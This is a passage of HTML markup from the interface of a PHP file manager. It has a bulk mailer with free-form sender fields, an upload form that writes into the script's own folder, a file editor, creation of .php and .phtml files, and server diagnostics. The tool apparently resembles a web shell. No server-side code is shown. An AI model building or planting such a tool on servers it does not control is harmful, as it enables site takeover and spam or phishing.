                        <path fill="#020203" d="M33.999,29.018l-1.835-3.165c-0.267-0.461-0.765-0.747-1.299-0.747	c-0.173,0-0.34,0.041-0.502,0.099c0.067-0.117,0.134-0.236,0.171-0.37l0.934-3.421c0.096-0.365,0.021-0.737-0.203-1.028	c-0.223-0.289-0.573-0.462-0.936-0.462c-0.205,0-0.407,0.054-0.586,0.156l-0.686,0.392l-1.591-2.757c-0.724-1.253-2.019-2-3.465-2h0	c-0.144,0-0.289,0.007-0.435,0.023c-1.258,0.131-2.429,0.936-3.131,2.153l-2.356,4.082c-0.394,0.683-0.183,1.546,0.459,1.984	c-0.071-0.01-0.137-0.035-0.21-0.035h0c0,0,0,0,0,0c-0.143,0-0.286,0.019-0.425,0.057l-3.422,0.93	c-0.462,0.125-0.8,0.513-0.861,0.989c-0.061,0.475,0.169,0.936,0.584,1.174l0.696,0.398l-0.898,1.55	c-0.801,1.381-0.712,3.049,0.234,4.351C14.977,34.389,16.259,35,17.665,35h4.388c0.827,0,1.5-0.672,1.5-1.498v-0.213	c0.057,0.314,0.204,0.614,0.445,0.856l2.506,2.509C26.727,36.877,27.023,37,27.337,37c0.651,0,1.181-0.529,1.181-1.18V35h1.816	c1.406,0,2.688-0.61,3.431-1.633C34.711,32.066,34.8,30.399,33.999,29.018z M23.553,32.71v-0.204c0-0.826-0.673-1.498-1.5-1.498	h-4.589l0.905-1.557l0.73,0.417c0.179,0.102,0.381,0.156,0.586,0.156c0.364,0,0.714-0.173,0.937-0.462	c0.225-0.292,0.3-0.663,0.206-1.02l-0.936-3.43c-0.056-0.205-0.159-0.384-0.283-0.547c0.2,0.094,0.415,0.154,0.636,0.154	c0.534,0,1.032-0.287,1.3-0.75L24,19.713l1.584,2.744l-0.736,0.421c-0.416,0.238-0.645,0.699-0.584,1.174	c0.061,0.475,0.399,0.863,0.861,0.989l3.422,0.93c0.139,0.038,0.282,0.057,0.425,0.057c0.01,0,0.018-0.005,0.028-0.005	c-0.206,0.19-0.375,0.414-0.449,0.691c-0.104,0.387-0.05,0.791,0.151,1.138l1.835,3.166l-2.018-0.005v-0.831	c0-0.651-0.53-1.181-1.182-1.181c-0.311,0-0.604,0.12-0.826,0.339l-2.512,2.515C23.756,32.096,23.609,32.396,23.553,32.71z" opacity=".05"></path>
                        <g opacity=".07"><path fill="#020203" d="M22.053,31.508h-4.589c-0.239,0-0.368-0.135-0.434-0.249c-0.064-0.112-0.117-0.29,0.001-0.494 l1.156-1.994l1.16,0.663c0.103,0.059,0.22,0.09,0.337,0.09c0.21,0,0.412-0.1,0.54-0.267c0.129-0.168,0.172-0.382,0.118-0.587 l-0.935-3.425c-0.133-0.486-0.577-0.826-1.081-0.826c-0.099,0-0.198,0.013-0.294,0.039l-3.422,0.93 c-0.266,0.072-0.461,0.296-0.496,0.57c-0.035,0.274,0.097,0.539,0.337,0.676l1.132,0.648l-1.15,1.985 c-0.7,1.208-0.622,2.667,0.206,3.806c0.649,0.893,1.78,1.427,3.026,1.427h4.388c0.551,0,1-0.448,1-0.998v-0.996 C23.053,31.956,22.604,31.508,22.053,31.508z"></path><path fill="#020203" d="M24.433,19.463l1.834,3.178l-1.172,0.67c-0.24,0.137-0.372,0.403-0.337,0.676 c0.035,0.274,0.23,0.497,0.496,0.57l3.422,0.93c0.096,0.026,0.195,0.039,0.294,0.039c0.504,0,0.948-0.34,1.081-0.826l0.934-3.421 c0.055-0.21,0.012-0.424-0.117-0.591c-0.129-0.167-0.331-0.267-0.54-0.267c-0.118,0-0.234,0.031-0.338,0.09l-1.118,0.64 l-1.84-3.189c-0.633-1.096-1.767-1.75-3.032-1.75h0c-0.127,0-0.254,0.007-0.383,0.02c-1.099,0.115-2.128,0.827-2.75,1.906 l-2.356,4.082c-0.276,0.478-0.111,1.09,0.366,1.366l0.866,0.5c0.152,0.088,0.325,0.134,0.499,0.134c0.356,0,0.688-0.192,0.867-0.5 l2.457-4.257c0.119-0.207,0.301-0.25,0.433-0.25S24.314,19.256,24.433,19.463z"></path><path fill="#020203" d="M33.566,29.269l-1.835-3.166c-0.178-0.307-0.51-0.498-0.866-0.498c-0.175,0-0.347,0.046-0.499,0.133 L29.5,26.236c-0.232,0.133-0.398,0.349-0.467,0.607C28.964,27.1,29,27.369,29.134,27.6l1.835,3.166 c0.118,0.204,0.065,0.382,0,0.496c-0.065,0.111-0.193,0.247-0.433,0.247h-2.518v-1.328c0-0.375-0.306-0.681-0.682-0.681 c-0.179,0-0.347,0.069-0.475,0.195l-2.509,2.512c-0.436,0.437-0.436,1.147,0,1.584l2.506,2.509c0.128,0.129,0.299,0.2,0.479,0.2 c0.376,0,0.681-0.305,0.681-0.68V34.5h2.316c1.246,0,2.377-0.533,3.026-1.426C34.188,31.934,34.267,30.476,33.566,29.269z"></path></g>
                        <path fill="#fff" d="M22.053,32.008h-4.589c-0.521,0-0.779-0.348-0.866-0.498c-0.086-0.15-0.26-0.547,0.001-0.996 l1.405-2.424L19.595,29c0.139,0.08,0.305-0.049,0.265-0.202l-0.934-3.421c-0.09-0.33-0.431-0.525-0.761-0.435l-3.422,0.93 c-0.154,0.042-0.181,0.25-0.042,0.33l1.569,0.897l-1.403,2.42c-0.596,1.028-0.538,2.276,0.178,3.262 C15.637,33.596,16.653,34,17.665,34h4.388c0.276,0,0.5-0.223,0.5-0.498v-0.996C22.553,32.231,22.329,32.008,22.053,32.008z"></path>
                        <path fill="#fff" d="M24.866,19.213l2.085,3.613l-1.608,0.92c-0.139,0.08-0.112,0.288,0.042,0.33l3.422,0.93 c0.33,0.09,0.671-0.105,0.761-0.435l0.934-3.421c0.04-0.153-0.125-0.282-0.265-0.202l-1.551,0.887l-2.089-3.62 c-0.598-1.034-1.715-1.609-2.93-1.483c-1.006,0.105-1.863,0.782-2.369,1.658l-2.356,4.082c-0.138,0.239-0.056,0.545,0.183,0.683 l0.866,0.5c0.239,0.138,0.545,0.056,0.683-0.183l2.457-4.257c0.261-0.451,0.692-0.5,0.866-0.5S24.605,18.762,24.866,19.213z"></path>
                    </svg>
                </a>
                <a class="app-icon" href="?os=<?= h(urlencode($BASE_DIR)) ?>" title="Home" aria-label="Home" data-label="Home">
                    <svg class="home-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0 0 48 48" aria-hidden="true">
                        <defs>
                            <linearGradient id="home_hdr_gr1" x1="24" x2="24" y1="6.708" y2="14.977" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#eba600"></stop><stop offset="1" stop-color="#c28200"></stop></linearGradient>
                            <linearGradient id="home_hdr_gr2" x1="24" x2="24" y1="10.854" y2="40.983" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#ffd869"></stop><stop offset="1" stop-color="#fec52b"></stop></linearGradient>
                            <linearGradient id="home_hdr_gr3" x1="-249.916" x2="-254.882" y1="-334.1" y2="-329.135" gradientTransform="matrix(1 0 0 -1 267.362 -300.945)" gradientUnits="userSpaceOnUse"><stop offset=".365" stop-color="#199ae0"></stop><stop offset=".699" stop-color="#1898de"></stop><stop offset=".819" stop-color="#1691d8"></stop><stop offset=".905" stop-color="#1186cc"></stop><stop offset=".974" stop-color="#0a75bc"></stop><stop offset="1" stop-color="#076cb3"></stop></linearGradient>
                            <linearGradient id="home_hdr_gr4" x1="-256.525" x2="-250.131" y1="-329.399" y2="-323.005" gradientTransform="matrix(1 0 0 -1 267.362 -300.945)" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#32bdef"></stop><stop offset="1" stop-color="#1ea2e4"></stop></linearGradient>
                            <linearGradient id="home_hdr_gr5" x1="961.808" x2="956.842" y1="-334.1" y2="-329.135" gradientTransform="rotate(180 496.181 -150.472)" gradientUnits="userSpaceOnUse"><stop offset=".365" stop-color="#199ae0"></stop><stop offset=".699" stop-color="#1898de"></stop><stop offset=".819" stop-color="#1691d8"></stop><stop offset=".905" stop-color="#1186cc"></stop><stop offset=".974" stop-color="#0a75bc"></stop><stop offset="1" stop-color="#076cb3"></stop></linearGradient>
                            <linearGradient id="home_hdr_gr6" x1="955.199" x2="961.593" y1="-329.399" y2="-323.005" gradientTransform="rotate(180 496.181 -150.472)" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#32bdef"></stop><stop offset="1" stop-color="#1ea2e4"></stop></linearGradient>
                        </defs>
                        <path fill="url(#home_hdr_gr1)" d="M24.414,10.414l-2.536-2.536C21.316,7.316,20.553,7,19.757,7L5,7C3.895,7,3,7.895,3,9l0,30	c0,1.105,0.895,2,2,2h38c1.105,0,2-0.895,2-2V13c0-1.105-0.895-2-2-2l-17.172,0C25.298,11,24.789,10.789,24.414,10.414z"></path>
                        <path fill="url(#home_hdr_gr2)" d="M21.586,14.414l3.268-3.268C24.947,11.053,25.074,11,25.207,11H43c1.105,0,2,0.895,2,2v26	c0,1.105-0.895,2-2,2H5c-1.105,0-2-0.895-2-2V15.5C3,15.224,3.224,15,3.5,15h16.672C20.702,15,21.211,14.789,21.586,14.414z"></path>
                        <path fill="url(#home_hdr_gr3)" d="M10.215,27.908l5.528,5.528c0.225,0.225,0.59,0.225,0.815,0l1.168-1.168 c0.225-0.225,0.225-0.59,0-0.815l-5.528-5.529c-0.225-0.225-0.59-0.225-0.815,0l-1.169,1.168 C9.99,27.317,9.99,27.683,10.215,27.908z"></path>
                        <path fill="url(#home_hdr_gr4)" d="M12.199,29.076l5.528-5.528c0.225-0.225,0.225-0.59,0-0.815l-1.168-1.168 c-0.225-0.225-0.59-0.225-0.815,0l-5.529,5.528c-0.225,0.225-0.225,0.59,0,0.815l1.168,1.168 C11.608,29.301,11.974,29.301,12.199,29.076z"></path>
                        <path fill="url(#home_hdr_gr5)" d="M37.785,27.908l-5.528,5.528c-0.225,0.225-0.59,0.225-0.815,0l-1.168-1.168 c-0.225-0.225-0.225-0.59,0-0.815l5.528-5.528c0.225-0.225,0.59-0.225,0.815,0l1.168,1.168 C38.01,27.317,38.01,27.683,37.785,27.908z"></path>
                        <path fill="url(#home_hdr_gr6)" d="M35.802,29.076l-5.528-5.528c-0.225-0.225-0.225-0.59,0-0.815l1.168-1.168 c0.225-0.225,0.59-0.225,0.815,0l5.528,5.528c0.225,0.225,0.225,0.59,0,0.815l-1.168,1.168 C36.392,29.301,36.027,29.301,35.802,29.076z"></path>
                        <path fill="#0078d4" d="M24.902,18.373l-4.737,18C20.082,36.69,20.321,37,20.649,37h1.966c0.227,0,0.426-0.153,0.484-0.373	l4.737-18C27.918,18.31,27.679,18,27.351,18h-1.966C25.158,18,24.96,18.153,24.902,18.373z"></path>
                    </svg>
                </a>
                <a class="app-icon" href="#" id="settings-trigger" title="Settings" aria-label="Settings" data-label="Settings">
                    <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0 0 48 48">
                        <linearGradient id="S-3uZWb86E5mIfWsom8tFa_EHYRINeSAUFT_gr1" x1="-5.186" x2="71.747" y1="52.653" y2="-22.875" gradientUnits="userSpaceOnUse">
                            <stop offset="0" stop-color="#faf3df"></stop>
                            <stop offset="1" stop-color="#5578b8"></stop>
                        </linearGradient>
                        <path fill="url(#S-3uZWb86E5mIfWsom8tFa_EHYRINeSAUFT_gr1)" d="M41.426,19.561c-0.43-1.691-1.094-3.284-1.965-4.746l1.67-4.268	c0.332-0.848,0.13-1.813-0.514-2.457l-1.768-1.768l-5.666,2.217c-1.462-0.87-3.054-1.535-4.745-1.965l-1.838-4.2	C26.236,1.539,25.411,1,24.5,1H22l-2.439,5.574c-1.691,0.43-3.284,1.094-4.746,1.965l-4.268-1.67	C9.699,6.537,8.734,6.739,8.09,7.383L6.322,9.151l2.217,5.666c-0.87,1.462-1.535,3.054-1.965,4.745l-4.2,1.838	C1.539,21.764,1,22.589,1,23.5V26l5.574,2.439c0.43,1.691,1.094,3.284,1.965,4.746l-1.67,4.268c-0.332,0.849-0.13,1.813,0.514,2.458	l1.768,1.768l5.666-2.217c1.462,0.87,3.054,1.535,4.745,1.965l1.838,4.2C21.764,46.461,22.589,47,23.5,47H26l2.439-5.574	c1.691-0.43,3.284-1.094,4.746-1.965l4.268,1.67c0.849,0.332,1.813,0.13,2.458-0.514l1.768-1.768l-2.217-5.666	c0.87-1.462,1.535-3.054,1.965-4.745l4.2-1.838C46.461,26.236,47,25.411,47,24.5V22L41.426,19.561z"></path>
                        <linearGradient id="S-3uZWb86E5mIfWsom8tFb_EHYRINeSAUFT_gr2" x1="3.781" x2="30.502" y1="3.781" y2="30.502" gradientUnits="userSpaceOnUse">
                            <stop offset="0" stop-color="#faf3df"></stop>
                            <stop offset="1" stop-color="#344878"></stop>
                        </linearGradient>
                        <circle cx="24" cy="24" r="10" fill="url(#S-3uZWb86E5mIfWsom8tFb_EHYRINeSAUFT_gr2)"></circle>
                    </svg>
                </a>
                <a class="app-icon" href="#" id="about-trigger" title="About" aria-label="About" data-label="About">
                    <span class="material-symbols-rounded">account_circle</span>
                </a>
                <a class="app-icon" href="?logout=1" id="logout-trigger" title="Logout" aria-label="Logout" data-label="Logout" onclick="if(window.spawnConfirmWindow){window.spawnConfirmWindow({message:'Are you sure you want logout now?',anchor:this,onYes:function(){location.href=(document.getElementById('logout-trigger')||{}).href||'?logout=1';},onNo:function(){}});}else{if(window.confirm('Are you sure you want logout now?')){location.href=(document.getElementById('logout-trigger')||{}).href||'?logout=1';}} return false;">
                    <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0 0 72 72" aria-hidden="true" style="fill:#FA5252;">
                        <path d="M 36 10 C 21.663 10 10 21.664 10 36 C 10 50.336 21.663 62 36 62 C 45.183 62 53.259719 57.208 57.886719 50 L 47.285156 50 C 44.196156 52.497 40.272 54 36 54 C 26.075 54 18 45.925 18 36 C 18 26.075 26.075 18 36 18 C 40.273 18 44.196156 19.503 47.285156 22 L 57.886719 22 C 53.259719 14.792 45.183 10 36 10 z M 52.515625 26.5 C 51.876 26.50225 51.235547 26.748781 50.748047 27.238281 C 49.776047 28.218281 49.782719 29.800438 50.761719 30.773438 L 53.003906 33 L 39 33 C 37.343 33 36 34.343 36 36 C 36 37.657 37.343 39 39 39 L 53.005859 39 L 50.763672 41.226562 C 49.783672 42.199562 49.777 43.781719 50.75 44.761719 C 51.239 45.253719 51.880437 45.5 52.523438 45.5 C 53.160437 45.5 53.798156 45.258438 54.285156 44.773438 L 61.335938 37.773438 C 61.807938 37.304437 62.074219 36.664047 62.074219 35.998047 C 62.074219 35.332047 61.808937 34.694609 61.335938 34.224609 L 54.285156 27.224609 C 53.795156 26.739109 53.15525 26.49775 52.515625 26.5 z"></path>
                    </svg>
                </a>
            </div>
            
        </div>
    </header>
    <!-- Notes popup template (cloned for each new window) -->
    <div class="notes-window" id="notes-template" role="dialog" aria-label="Notes" style="display:none;">
        <div class="notes-titlebar">
            <div class="notes-title">Notes</div>
            <button class="notes-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">cancel</span></button>
        </div>
        <div class="notes-body">
            <div class="notes-list" aria-live="polite"></div>
        </div>
        <div class="notes-actions">
            <button class="btn notes-add" type="button" title="New notes window" aria-label="New notes window"><span class="material-symbols-rounded">note_add</span></button>
            <div style="flex:1"></div>
            <button class="btn notes-clear" type="button" title="Clear all" aria-label="Clear all"><span class="material-symbols-rounded">delete</span></button>
        </div>
    </div>
    <!-- Layer to hold multiple notes windows -->
    <div id="notes-layer"></div>
    <!-- Mailer popup template -->
    <div class="mailer-window" id="mailer-template" role="dialog" aria-label="Mailer" style="display:none;">
        <div class="mailer-titlebar">
            <div class="mailer-title">Mailer</div>
            <button class="mailer-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">cancel</span></button>
        </div>
        <div class="mailer-body">
            <form class="mailer-form" id="mailer-form">
                <div class="mailer-field">
                    <label for="mailer-from-email"><span class="material-symbols-rounded" aria-hidden="true">alternate_email</span><span>From Email</span></label>
                    <input type="email" id="mailer-from-email" name="from_email" placeholder="sender@example.com" required>
                </div>
                <div class="mailer-field">
                    <label for="mailer-from-name"><span class="material-symbols-rounded" aria-hidden="true">person</span><span>From Name</span></label>
                    <input type="text" id="mailer-from-name" name="from_name" placeholder="Your Name" required>
                </div>
                <div class="mailer-field">
                    <label for="mailer-subject"><span class="material-symbols-rounded" aria-hidden="true">subject</span><span>Subject</span></label>
                    <input type="text" id="mailer-subject" name="subject" placeholder="Email Subject" required>
                </div>
                <div class="mailer-field">
                    <label for="mailer-recipients"><span class="material-symbols-rounded" aria-hidden="true">group</span><span>Recipients (one per line)</span></label>
                    <textarea id="mailer-recipients" name="recipients" placeholder="recipient1@example.com&#10;recipient2@example.com" rows="4" required></textarea>
                </div>
                <div class="mailer-field">
                    <label for="mailer-message"><span class="material-symbols-rounded" aria-hidden="true">description</span><span>Message Body</span></label>
                    <div class="mailer-format-toggle">
                        <label><input type="radio" name="format" value="text" checked><span class="material-symbols-rounded" aria-hidden="true">text_fields</span><span>Text</span></label>
                        <label><input type="radio" name="format" value="html"><span class="material-symbols-rounded" aria-hidden="true">code</span><span>HTML</span></label>
                    </div>
                    <textarea id="mailer-message" name="message" placeholder="Your message here..." rows="8" required></textarea>
                </div>
                <div class="mailer-field">
                    <label><span class="material-symbols-rounded" aria-hidden="true">dns</span><span>SMTP Settings (optional)</span></label>
                    <div class="mailer-smtp-toggle">
                        <label><input type="checkbox" id="mailer-use-smtp" name="use_smtp"><span class="material-symbols-rounded" aria-hidden="true">dns</span><span>Use SMTP</span></label>
                    </div>
                    <div style="display:grid; grid-template-columns: 1fr 1fr; gap:8px;">
                        <select id="mailer-smtp-secure" name="smtp_secure">
                            <option value="tls">TLS</option>
                            <option value="ssl">SSL</option>
                            <option value="none">None</option>
                        </select>
                        <input type="text" id="mailer-smtp-host" name="smtp_host" placeholder="smtp.example.com">
                        <input type="number" id="mailer-smtp-port" name="smtp_port" placeholder="587">
                        <input type="text" id="mailer-smtp-user" name="smtp_user" placeholder="SMTP username">
                        <input type="password" id="mailer-smtp-pass" name="smtp_pass" placeholder="SMTP password">
                        <input type="text" id="mailer-smtp-ehlo" name="smtp_ehlo" placeholder="EHLO hostname (optional)">
                    </div>
                </div>
                <div class="mailer-actions">
                    <div style="display:flex; align-items:center; gap:8px;">
                        <button type="button" class="btn mailer-send btn-icon" id="mailer-send-btn" title="Send" aria-label="Send" data-label="Send">
                            <span class="material-symbols-rounded">send</span>
                        </button>
                    <button type="button" class="btn mailer-pause btn-icon" id="mailer-pause-btn" title="Pause" aria-label="Pause" data-label="Pause" style="display:none;">
                        <span class="material-symbols-rounded">pause</span>
                    </button>
                    <button type="button" class="btn mailer-resume btn-icon" id="mailer-resume-btn" title="Continue" aria-label="Continue" data-label="Continue" style="display:none;">
                        <span class="material-symbols-rounded">play_arrow</span>
                    </button>
                    <button type="button" class="btn mailer-export btn-icon" id="mailer-export-btn" title="Export .eml" aria-label="Export .eml" data-label="Export">
                        <span class="material-symbols-rounded">download</span>
                    </button>
                </div>
                <div class="mailer-capability" id="mailer-capability" title="Server email capability">
                    <span class="mailer-cap-badge" id="mailer-cap-badge" aria-hidden="true"></span>
                    <span id="mailer-cap-label">Checking…</span>
                </div>
                <div class="mailer-status" id="mailer-status"></div>
            </div>
            </form>
            <div class="mailer-output" id="mailer-output" aria-live="polite" aria-label="Send output"></div>
        </div>
    </div>
    <!-- Layer to hold mailer windows -->
    <div id="mailer-layer"></div>
    <!-- Browser popup template -->
    <div class="browser-window" id="browser-template" role="dialog" aria-label="Browser" style="display:none;">
        <div class="browser-titlebar">
            <div class="browser-title">Browser</div>
            <button class="browser-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">cancel</span></button>
        </div>
        <div class="browser-body landing">
            <div class="browser-landing" role="document">
                <div class="landing-logo" aria-label="CODING 2.0">
                    <span class="logo-text">C</span>
                    <span class="logo-o" aria-hidden="true">
                        <svg class="logo-spinner" viewBox="0 0 24 24" role="img" aria-label="O loading">
                            <circle class="base" cx="12" cy="12" r="9" stroke="Chartreuse" stroke-width="3" fill="none" />
                            <circle class="spin" cx="12" cy="12" r="9" stroke="Chartreuse" stroke-width="3" fill="none" stroke-linecap="round" stroke-dasharray="56" stroke-dashoffset="42" />
                            <circle class="dot" cx="12" cy="12" r="2" />
                        </svg>
                    </span>
                    <span class="logo-text">DING 2.0</span>
                </div>
                <div class="landing-small" aria-hidden="true">search</div>
                <form class="landing-form" aria-label="Search or type URL">
                    <input class="landing-input" type="text" placeholder="Search or type URL" />
                    <button class="landing-submit" type="submit"><span class="material-symbols-rounded">search</span><span>Search</span></button>
                </form>
                <div class="landing-tip">Press Enter to search with Google, or type a full URL.</div>
            </div>
            <div class="browser-controls">
                <input class="browser-url" type="text" placeholder="Search or type URL">
                <button class="browser-go browser-go-btn" type="button" title="Go" aria-label="Go"><span class="material-symbols-rounded">arrow_forward</span><span>Go</span></button>
                <a class="browser-go browser-open-link" target="_blank" rel="noopener" title="Open in new tab" aria-label="Open in new tab"><span class="material-symbols-rounded">open_in_new</span><span>Open</span></a>
            </div>
            <iframe class="browser-frame" aria-label="Embedded site"></iframe>
            <div class="browser-help">Searches and URLs open in a new window. Use “Open” to re-launch the current address.</div>
        </div>
    </div>
    <!-- Layer to hold browser windows -->
    <div id="browser-layer"></div>
    <!-- Editor popup template -->
    <div class="editor-window" id="editor-template" role="dialog" aria-label="Editor" style="display:none;">
        <div class="editor-titlebar">
            <div class="editor-title">Edit File</div>
            <button class="editor-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">cancel</span></button>
        </div>
        <div class="editor-body">
            <textarea class="editor-textarea" spellcheck="false" aria-label="File content"></textarea>
            <div class="editor-ace" aria-label="File content" style="display:none"></div>
            <div class="editor-overlay" aria-live="polite" aria-atomic="true" aria-hidden="true">
                <div class="editor-overlay-content">
                    <span class="logo-o" aria-hidden="true">
                        <svg class="logo-spinner editor-logo-spinner" viewBox="0 0 24 24" role="img" aria-label="O loading">
                            <circle class="base" cx="12" cy="12" r="9" stroke="Chartreuse" stroke-width="3" fill="none" />
                            <circle class="spin" cx="12" cy="12" r="9" stroke="Chartreuse" stroke-width="3" fill="none" stroke-linecap="round" stroke-dasharray="56" stroke-dashoffset="42" />
                            <circle class="dot" cx="12" cy="12" r="2" />
                        </svg>
                    </span>
                    <div class="editor-overlay-sub"></div>
                </div>
            </div>
        </div>
    <div class="editor-footer">
    <div class="editor-search" role="search" aria-label="Search in file">
        <button class="editor-search-btn" type="button" title="Find Next" aria-label="Find Next">
            <span class="material-symbols-rounded" aria-hidden="true">search</span>
        </button>
        <input class="editor-search-input" type="text" placeholder="Search in file" aria-label="Search query">
    </div>
    <button class="editor-undo" type="button" title="Undo" aria-label="Undo"><span class="material-symbols-rounded">undo</span><span>Back</span></button>
    <button class="editor-redo" type="button" title="Redo" aria-label="Redo"><span class="material-symbols-rounded">redo</span><span>Redo</span></button>
    <button class="editor-save" type="button" title="Save" aria-label="Save"><span class="material-symbols-rounded">check_circle</span><span>Save</span></button>
        </div>
    </div>
    <!-- Layer to hold editor windows -->
    <div id="editor-layer"></div>
    <!-- Rename popup template -->
    <div class="rename-window" id="rename-template" role="dialog" aria-label="Rename" style="display:none;">
        <div class="rename-titlebar">
            <div class="rename-title">Rename</div>
            <button class="rename-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">cancel</span></button>
        </div>
        <div class="rename-body" style="padding:12px;">
            <div class="input-pill" style="margin:12px auto; max-width:480px;">
                <span class="material-symbols-rounded">drive_file_rename_outline</span>
                <input type="text" class="rename-input" placeholder="Enter new name" autocomplete="off" aria-label="New name">
            </div>
        </div>
        <div class="rename-footer" style="display:flex; align-items:center; justify-content:center; gap:8px; padding:8px 10px; border-top:1px solid var(--border); background: rgba(10,12,16,0.20);">
            <button class="rename-save icon-action icon-confirm" type="button" title="Rename" aria-label="Rename"><span class="material-symbols-rounded">check_circle</span></button>
        </div>
    </div>
    <!-- Layer to hold rename windows -->
    <div id="rename-layer"></div>
    <!-- Upload popup template -->
    <div class="upload-window" id="upload-template" role="dialog" aria-label="Upload" style="display:none;">
        <div class="upload-titlebar">
            <div class="upload-title"><span class="material-symbols-rounded" aria-hidden="true">file_upload</span> Upload</div>
            <button class="upload-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">cancel</span></button>
        </div>
        <div class="upload-body">
            <div class="upload-note" style="text-align:center; color:#cbd5e1; font-size:12px; margin:8px 0 12px;">
                <div style="display:flex; align-items:center; justify-content:center; gap:8px; margin-bottom:4px;">
                    <span class="material-symbols-rounded" aria-hidden="true" style="font-size:18px; color:#64748b;">info</span>
                    <span>Uploads are saved in the same folder as this script. Current limits:</span>
                </div>
                <div style="display:flex; flex-direction:column; align-items:center; gap:4px;">
                    <div style="display:flex; align-items:center; gap:8px;">
                        <span class="material-symbols-rounded" aria-hidden="true" style="font-size:16px; color:#64b5f6;">file_upload</span>
                        <span>upload_max_filesize: <span style="color:#93c5fd; font-weight:600;">40M</span></span>
                    </div>
                    <div style="display:flex; align-items:center; gap:8px;">
                        <span class="material-symbols-rounded" aria-hidden="true" style="font-size:16px; color:#64b5f6;">cloud_upload</span>
                        <span>post_max_size: <span style="color:#93c5fd; font-weight:600;">40M</span></span>
                    </div>
                </div>
            </div>
            <form class="upload-form" enctype="multipart/form-data">
                <div class="upload-pill" style="margin:12px auto; max-width:480px;">
                    <span class="material-symbols-rounded" aria-hidden="true" style="color:#ffffff;">cloud_upload</span>
                    <label for="upload-file" class="upload-label" title="Choose a file…">Choose a file…</label>
                    <input type="file" id="upload-file" name="upload" accept="*/*">
                </div>
                <div class="upload-progress" aria-label="Progress" style="max-width:480px; margin:6px auto 0; border:1px solid var(--border); border-radius:9999px; height:10px; background: rgba(255,255,255,.06); overflow:hidden; display:none;">
                    <div class="bar" style="height:100%; width:0%; background: Chartreuse; transition: width .12s ease;"></div>
                </div>
                <div class="upload-stats" style="text-align:center; font-size:12px; color:#cbd5e1; margin-top:6px; display:none;">
                    <span class="pct">0%</span>
                    <span class="sep">·</span>
                    <span class="speed">0 MB/s</span>
                    <span class="sep">·</span>
                    <span class="eta">ETA: —</span>
                    <span class="sep">·</span>
                    <span class="size">Size: —</span>
                </div>
                <div class="upload-actions" style="text-align:center; padding:8px 10px; display:flex; gap:8px; justify-content:center; align-items:center;">
                    <button class="icon-action icon-confirm upload-submit" type="submit" title="Upload"><span class="material-symbols-rounded">check_circle</span></button>
                </div>
    <div class="upload-diagnostics" style="max-width:520px; margin:0 auto; display:block; font-size:12px; color:#cbd5e1; border:1px dashed var(--border); border-radius:8px; padding:10px; text-align:left; background: rgba(255,255,255,0.03);">
        <div class="diag-target" style="display:flex; align-items:center; gap:8px; margin:4px 0;">
            <span class="material-symbols-rounded" aria-hidden="true" style="font-size:16px; color:#64748b;">task_alt</span>
            <span>Target dir writable: —</span>
        </div>
        <div class="diag-temp" style="display:flex; align-items:center; gap:8px; margin:4px 0;">
            <span class="material-symbols-rounded" aria-hidden="true" style="font-size:16px; color:#64748b;">folder_open</span>
            <span>Temp dir: — (writable: —)</span>
        </div>
        <div class="diag-free" style="display:flex; align-items:center; gap:8px; margin:4px 0;">
            <span class="material-symbols-rounded" aria-hidden="true" style="font-size:16px; color:#64748b;">storage</span>
            <span>Free disk space: —</span>
        </div>
        <div class="diag-basedir" style="display:flex; align-items:center; gap:8px; margin:4px 0;">
            <span class="material-symbols-rounded" aria-hidden="true" style="font-size:16px; color:#64748b;">lock</span>
            <span>open_basedir: —</span>
        </div>
        <div class="diag-file" style="display:flex; align-items:center; gap:8px; margin:4px 0;">
            <span class="material-symbols-rounded" aria-hidden="true" style="font-size:16px; color:#64748b;">description</span>
            <span>File name: —</span>
        </div>
    </div>
            </form>
        </div>
    </div>
    <!-- Layer to hold Upload windows -->
    <div id="upload-layer"></div>
    <!-- New (Add) popup template -->
    <div class="add-window" id="add-template" role="dialog" aria-label="New" style="display:none;">
        <div class="add-titlebar">
            <div class="add-title"><span class="material-symbols-rounded" aria-hidden="true">add_circle</span> New</div>
            <button class="add-close" title="Close" aria-label="Close"><span class="material-symbols-rounded">cancel</span></button>
        </div>
        <div class="add-body">
            <form class="add-form">
                <p style="text-align:center; margin-bottom:12px;">
                    <label style="margin-right:14px;"><input type="radio" name="create_type" value="file" checked> File</label>
                    <label><input type="radio" name="create_type" value="folder"> Folder</label>
                </p>
                <div style="display:grid; grid-template-columns: 1fr; gap:12px; justify-items:center;">
                    <div class="input-pill file-only"><span class="material-symbols-rounded">description</span><input type="text" name="file_name" placeholder="File name (base)" autocomplete="off"></div>
                    <div class="input-pill file-only"><span class="material-symbols-rounded">extension</span><select id="file-ext-select" name="file_ext"><option value="php">.php</option><option value="phtml">.phtml</option><option value="html">.html</option><option value="txt">.txt</option></select></div>
                    <div class="input-pill folder-only"><span class="material-symbols-rounded">create_new_folder</span><input type="text" name="folder_name" placeholder="Folder name" autocomplete="off"></div>
                </div>
                <p class="form-actions" style="text-align:center; padding:8px 10px;"><button class="icon-action icon-confirm add-submit" type="submit" title="Create"><span class="material-symbols-rounded">check_circle</span></button></p>
            </form>
        </div>
    </div>
    <!-- Layer to hold New windows -->
    <div id="add-layer"></div>
    <!-- Zip popup template -->
    <div class="zip-window" id="zip-template" role="dialog" aria-label="Zip" style="display:none;">
        <div class="rename-titlebar">
